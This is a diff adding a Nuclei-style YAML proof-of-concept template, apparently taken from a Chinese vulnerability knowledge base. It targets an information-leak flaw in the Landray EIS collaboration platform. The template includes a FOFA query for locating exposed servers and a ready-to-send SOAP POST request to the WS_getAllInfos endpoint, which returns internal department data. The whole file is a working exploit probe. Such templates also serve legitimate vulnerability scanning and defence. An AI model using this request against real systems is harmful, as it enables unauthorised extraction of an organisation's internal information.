@@ -1,0 +1,78 @@
+id: poc-sobtmhvoffrnxwte
+info:
+  name: 蓝凌 EIS智慧协同平台 WS_getAllInfos 信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sobtmhvoffrnxwte'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: sobtmhvoffrnxwte
+    fofa: app="Landray-EIS智慧协同平台"
+http:
+- raw:
+  - 'POST /WS/Basic/Basic.asmx HTTP/1.1
+
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Connection: close
+
+
+    Cookie: ASP.NET_SessionId=u1n0cky5q5giplqhpajjrf55; FIOA_IMG_FOLDER=FI
+
+
+    Upgrade-Insecure-Requests: 1
+
+
+    SOAPAction: [http://tempuri.org/WS_getAllInfos](http://tempuri.org/WS_getAllInfos)
+
+
+    Content-Type: text/xml;charset=UTF-8
+
+
+
+
+    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+
+
+    <soapenv:Header/>
+
+
+    <soapenv:Body>
+
+
+    <tem:WS_getAllInfos/>
+
+
+    </soapenv:Body>
+
+
+    </soapenv:Envelope>
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    WS_Department
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
